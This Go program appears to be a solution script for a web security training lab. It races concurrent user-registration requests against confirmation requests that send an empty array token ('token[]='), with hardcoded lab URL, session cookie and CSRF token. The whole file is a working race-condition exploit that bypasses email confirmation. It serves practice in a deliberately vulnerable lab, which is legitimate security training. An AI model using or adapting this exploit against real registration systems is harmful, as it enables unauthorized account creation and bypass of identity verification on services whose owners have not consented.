package main

import (
	"fmt"
	"net/http"
	"strconv"
	"sync"
	"time"
)

var (
	main_url       = "https://0ae3007a0415634281a789f0006700d5.web-security-academy.net" // should NOT end with "/"
	session_cookie = "xX9Ie7fMV51jIshXpZH0Uie6BmZZnPeu"

	http_client = http.Client{
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}
)

// before start make sure you have an item that you can buy in your cart
func main() {
	var wg sync.WaitGroup

	for delay := 100; delay < 500; delay++ {
		user := "user" + strconv.Itoa(delay)

		// get a home page: something like a connection warming request
		makeHttpReq(http.MethodGet, main_url, "", false)

		wg.Add(2)
		go registerUser(&wg, user)
		go confirmRegistration(&wg, user, delay)
		fmt.Println("***********")

		wg.Wait()
	}
}

func registerUser(wg *sync.WaitGroup, user string) {
	defer wg.Done()

	start := time.Now()

	resp := makeHttpReq(http.MethodPost, main_url+"/register", "csrf=LBcAlj1sDqoqHIsfakrnavQ8R1pCgGsp&username="+user+"&email="+user+"%40ginandjuice.shop&password=1234", true)
	defer resp.Body.Close()

	elapsed := time.Since(start).Milliseconds()
	fmt.Println("reg:")
	fmt.Println(elapsed)

	// rawHttpLikeOutput(resp)
}

func confirmRegistration(wg *sync.WaitGroup, user string, delay int) {
	defer wg.Done()

	start := time.Now()

	time.Sleep(time.Millisecond * time.Duration(delay))

	resp := makeHttpReq(http.MethodPost, main_url+"/confirm?token[]=", "", true)
	defer resp.Body.Close()

	elapsed := time.Since(start).Milliseconds()
	fmt.Println("confirm:")
	fmt.Println(elapsed)

	// rawHttpLikeOutput(resp)

	if resp.StatusCode != 400 {
		fmt.Println("##################")
		fmt.Println("##################")
		fmt.Println("##################")
		fmt.Println(user)
		fmt.Println("##################")
		fmt.Println("##################")
		fmt.Println("##################")
	}
}
